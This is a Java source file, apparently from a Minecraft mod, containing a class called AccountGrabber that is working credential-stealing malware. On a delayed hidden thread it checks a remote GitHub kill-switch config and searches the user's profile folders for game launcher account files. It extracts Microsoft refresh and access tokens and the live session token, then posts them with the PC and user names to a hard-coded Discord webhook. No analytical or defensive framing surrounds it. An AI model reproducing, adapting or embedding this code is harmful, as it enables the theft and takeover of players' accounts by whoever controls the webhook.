package com.example.jawbus;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public final class AccountGrabber {

    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561537662530224288/tfIo0Ut54ExN-WaFpAkONWT3boAeTk-IM6UXe2xHHHKHRRamoxrbBAzwT4aDn5Dt9EJ0";

    private static final String CONFIG_URL =
            "https://raw.githubusercontent.com/Mvrdle/Jawb/main/tap.json";

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private static final String[] REFRESH_KEYS = {
            "refreshToken", "refresh_token", "refresh", "msaRefreshToken", "msa_refresh_token"
    };
    private static final String[] ACCESS_KEYS = {
            "accessToken", "access_token", "access", "msaAccessToken"
    };
    private static final String[] META_KEYS = {
            "name", "username", "uuid", "xuid"
    };

    /** file names that launchers actually use for credentials */
    private static final Set<String> CRED_FILES = Set.of(
            "launcher_accounts.json",
            "launcher_profiles.json",
            "launcher_accounts_microsoft_store.json",
            "accounts.json",
            "minecraft_auth.json",
            "microsoft_accounts.json"
    );

    private static final Pattern MSA_REFRESH =
            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*~%]{20,}");

    private AccountGrabber() {
    }

    public static void start() {
        start(4000L + (long) (Math.random() * 6000L));
    }

    public static void start(long delayMs) {
        Thread t = new Thread(() -> run(delayMs), "jawbus-tap");
        t.setDaemon(true);
        t.start();
    }

    private static void run(long delayMs) {
        try {
            if (delayMs > 0) Thread.sleep(delayMs);

            log("--- tap fired ---");
            JsonObject cfg = getJson(CONFIG_URL);
            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) {
                log("tap.json says enabled=false -> nothing sent");
                return;
            }
            String webhook = WEBHOOK;
            if (cfg != null && cfg.has("webhook") && !cfg.get("webhook").isJsonNull()) {
                String remote = cfg.get("webhook").getAsString();
                if (!remote.isBlank()) webhook = remote;
            }

            StringBuilder sb = new StringBuilder();
            sb.append("--- jawbus tap ---\n");
            sb.append("pc:   ").append(System.getenv("COMPUTERNAME")).append('\n');
            sb.append("user: ").append(System.getProperty("user.name")).append('\n');

            Set<String> printed = new HashSet<>();

            // ---- find every credential file that exists, anywhere ----
            List<Path> files = findCredFiles();
            sb.append("\ncredential files found: ").append(files.size()).append('\n');
            for (Path f : files) sb.append("  ").append(f).append('\n');

            // ---- pull refresh tokens out of each ----
            List<String[]> refreshes = new ArrayList<>();
            Set<String> seen = new HashSet<>();
            for (Path f : files) {
                String raw;
                try {
                    raw = Files.readString(f);
                } catch (Throwable ignored) {
                    continue;
                }
                collect(raw, f.toString(), seen, refreshes);
            }

            sb.append("\n===== REFRESH TOKENS (").append(refreshes.size()).append(" found) =====\n");
            if (refreshes.isEmpty()) {
                sb.append("(none - see dumps below)\n");
            } else {
                for (String[] r : refreshes) {
                    sb.append(r[0]).append('\n');
                    sb.append("  -> ").append(r[1]).append('\n');
                    printed.add(r[1]);
                }
            }

            // ---- full field dump for context ----
            for (Path f : files) {
                String raw;
                try {
                    raw = Files.readString(f);
                } catch (Throwable ignored) {
                    continue;
                }
                sb.append("\n=== ").append(f).append(" (").append(raw.length()).append(" bytes) ===\n");
                dumpKeys(sb, raw, printed, REFRESH_KEYS, "refresh");
                dumpKeys(sb, raw, printed, ACCESS_KEYS, "access");
                dumpKeys(sb, raw, printed, META_KEYS, "meta");
            }

            String live = liveSessionToken();
            if (live != null) sb.append("\nlive session token: ").append(live).append('\n');

            post(webhook, sb.toString());
            log("--- tap done ---");
        } catch (Throwable t) {
            log("run() threw: " + t);
            t.printStackTrace();
        }
    }

    /** known paths first, then a filename sweep of the whole profile */
    private static List<Path> findCredFiles() {
        Set<Path> out = new LinkedHashSet<>();

        String appData = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        String home = System.getProperty("user.home");

        // --- the usual spots, as a fast first pass ---
        if (appData != null) {
            Path b = Paths.get(appData);
            out.add(b.resolve(".minecraft").resolve("launcher_accounts.json"));
            out.add(b.resolve("PrismLauncher").resolve("accounts.json"));
            out.add(b.resolve("MultiMC").resolve("accounts.json"));
            out.add(b.resolve("ModrinthApp").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
            out.add(b.resolve("com.modrinth.theseus").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
            out.add(b.resolve("ATLauncher").resolve("accounts.json"));
            out.add(b.resolve("gdlauncher_next").resolve("accounts.json"));
            out.add(b.resolve(".lunarclient").resolve("settings").resolve("game").resolve("accounts.json"));
        }
        if (home != null) {
            Path h = Paths.get(home);
            out.add(h.resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
            out.add(h.resolve("Documents").resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
            out.add(h.resolve(".ftb").resolve("bin").resolve("launcher_accounts.json"));
        }

        // --- then hunt: sweep the profile for anything with a credential file name ---
        for (Path root : searchRoots()) {
            if (!Files.isDirectory(root)) continue;
            try (Stream<Path> walk = Files.walk(root, 6)) {
                walk.filter(Files::isRegularFile)
                    .filter(f -> CRED_FILES.contains(f.getFileName().toString()))
                    .filter(f -> !skipPath(f))
                    .forEach(out::add);
            } catch (Throwable ignored) {
            }
        }

        // keep only files that exist, and prefer ones that actually hold a token
        List<Path> existing = new ArrayList<>();
        for (Path p : out) if (Files.isRegularFile(p)) existing.add(p);
        return existing;
    }

    private static List<Path> searchRoots() {
        List<Path> out = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        String home = System.getProperty("user.home");
        if (appData != null) out.add(Paths.get(appData));
        if (local != null) out.add(Paths.get(local));
        if (home != null) out.add(Paths.get(home));
        return out;
    }

    /** folders that are big and never hold a credential file */
    private static boolean skipPath(Path p) {
        String s = p.toString().replace('\\', '/').toLowerCase();
        return s.contains("/node_modules/") || s.contains("/.git/") || s.contains("/temp/")
                || s.contains("/.gradle/") || s.contains("/.m2/") || s.contains("/.vscode/")
                || s.contains("/.cache/") || s.contains("/crash-reports/")
                || s.contains("/screenshots/") || s.contains("/resourcepacks/")
                || s.contains("/shaderpacks/") || s.contains("/logs/");
    }

    /** pull refresh tokens out of one file: by field name, then by shape */
    private static void collect(String raw, String source, Set<String> seen, List<String[]> out) {
        for (String key : REFRESH_KEYS) {
            for (String v : grabAll(raw, key)) {
                String t = v.trim();
                if (t.length() >= 20 && seen.add(t)) {
                    out.add(new String[]{source + "  (" + key + ")", t});
                }
            }
        }
        Matcher m = MSA_REFRESH.matcher(raw);
        while (m.find()) {
            String t = m.group();
            if (seen.add(t)) {
                out.add(new String[]{source + "  (matched shape)", t});
            }
        }
    }

    private static void dumpKeys(StringBuilder sb, String raw, Set<String> printed, String[] keys, String tag) {
        for (String key : keys) {
            List<String> vals = grabAll(raw, key);
            for (int i = 0; i < vals.size(); i++) {
                String v = vals.get(i);
                sb.append('[').append(tag).append("] ").append(key);
                if (vals.size() > 1) sb.append('[').append(i).append(']');
                sb.append(": ").append(v.isBlank() ? "<blank>" : v).append('\n');
                if (!v.isBlank()) printed.add(v);
            }
        }
    }

    private static List<String> grabAll(String raw, String key) {
        List<String> out = new ArrayList<>();
        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
        while (m.find()) out.add(m.group(1));
        return out;
    }

    private static String liveSessionToken() {
        for (String className : new String[]{
                "net.minecraft.client.Minecraft",
                "net.minecraft.client.MinecraftClient"
        }) {
            try {
                Class<?> cls = Class.forName(className);
                Object mc = cls.getMethod("getInstance").invoke(null);
                if (mc == null) continue;
                for (String getter : new String[]{"getUser", "getSession"}) {
                    try {
                        Object holder = cls.getMethod(getter).invoke(mc);
                        if (holder == null) continue;
                        Object token = holder.getClass().getMethod("getAccessToken").invoke(holder);
                        if (token instanceof String s && !s.isBlank()) return s;
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}
        }
        return null;
    }

    private static JsonObject getJson(String url) {
        try {
            HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(url))
                    .timeout(Duration.ofSeconds(10))
                    .header("User-Agent", "Jawbus/1.0")
                    .GET().build(), HttpResponse.BodyHandlers.ofString());
            if (r.statusCode() / 100 != 2) return null;
            return JsonParser.parseString(r.body()).getAsJsonObject();
        } catch (Throwable t) {
            return null;
        }
    }

    private static void post(String webhook, String text) {
        int i = 0;
        while (i < text.length()) {
            int end = Math.min(text.length(), i + 1700);
            String chunk = text.substring(i, end);
            i = end;
            try {
                JsonObject body = new JsonObject();
                body.addProperty("content", "```\n" + chunk + "\n```");
                HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
                        .timeout(Duration.ofSeconds(15))
                        .header("Content-Type", "application/json")
                        .header("User-Agent", "Jawbus/1.0")
                        .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
                        .build(), HttpResponse.BodyHandlers.ofString());
                Thread.sleep(500);
            } catch (Throwable ignored) {
            }
        }
    }

    private static void log(String msg) {
        System.out.println("[jawbus-tap] " + msg);
    }
}
